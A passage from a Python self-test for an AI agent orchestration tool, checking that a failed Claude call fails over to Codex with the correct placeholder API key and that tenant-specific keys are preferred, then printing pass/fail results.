            shutil.which = lambda name: "/usr/bin/codex" if name == "codex" else _orig_which(name)
            _ctx.tenant = None
            _ctx.engine = "claude"
            _ctx.api_key = "sk-ant-selftest"
            _ctx.codex_key = "sk-codex-selftest"
            _ctx.product = None
            calls = []
            globals()["_run_once"] = lambda *a, **k: (1, "529 overloaded", 0.0, 0, 0, BUILD_MODEL)

            def _fake_codex(role, repo, prompt, timeout, env):
                calls.append(env.get("OPENAI_API_KEY"))
                return 0, "CODEX_OK", 0.0, 11, 3, CODEX_MODEL

            globals()["_run_once_codex"] = _fake_codex
            rc3 = agent("builder", str(PRODUCTS), "tiny task", timeout=1, retries=0, model=BUILD_MODEL, tools=[])
            failover_ok = (rc3.get("rc") == 0 and rc3.get("engine") == "codex"
                           and rc3.get("out_full") == "CODEX_OK"
                           and calls == ["sk-codex-selftest"])

            # The tenant-specific fallback resolver must prefer the tenant's OpenAI/Codex key, not platform
            # Codex, when a tenant is in context.
            import tenantproviders as _tp
            _real_resolve_provider = getattr(_tp, "resolve_provider")
            _tp.resolve_provider = lambda tid, provider: {"connected": True, "provider": "openai",
                                                          "engine": "codex", "key": "sk-tenant-codex",
                                                          "auth_mode": "api_key"}
            _ctx.tenant = "t-selftest"
            _ctx.codex_key = None
            env4, src4 = _codex_fallback_env()
            fallback_env_ok = (env4 and env4.get("OPENAI_API_KEY") == "sk-tenant-codex"
                               and src4 == "tenant-openai-api_key")
            _tp.resolve_provider = _real_resolve_provider
        except Exception as e:
            print(f"Codex failover selftest error: {e}")
        finally:
            globals()["_run_once"] = _orig_run_once; globals()["_run_once_codex"] = _orig_run_codex
            shutil.which = _orig_which; audit.append = _orig_audit3; globals()["_trace"] = _orig_trace
            killswitch.is_halted = _orig_halt
            for k, v in _old_ctx.items():
                setattr(_ctx, k, v)

        ok = (ok and cost_ok and pool_ok and sig_ok and cancel_ok and success_ok
              and gate_ok and indep_pass_ok and indep_fail_ok and artifact_ok
              and failover_ok and fallback_env_ok)
        print(f"warm-HTTP: cost={cost_ok} pool={pool_ok} | stop: sig={sig_ok} cancel-discarded={cancel_ok} "
              f"stream-success={success_ok}")
        print(f"C1 ship gate: verdict-condition={gate_ok} independent-qa-pass={indep_pass_ok} "
              f"fail-closed={indep_fail_ok} launch-artifact={artifact_ok}")
        print(f"Codex failover: claude-key-to-codex={failover_ok} tenant-codex-env={fallback_env_ok}")
        print("PASS: factory prompt assembly + governance wiring + fast-path/stop + C1 grounded ship gate ✅"
              if ok else "FAIL")
        sys.exit(0 if ok else 1)


if __name__ == "__main__":
    _main(sys.argv[1:])
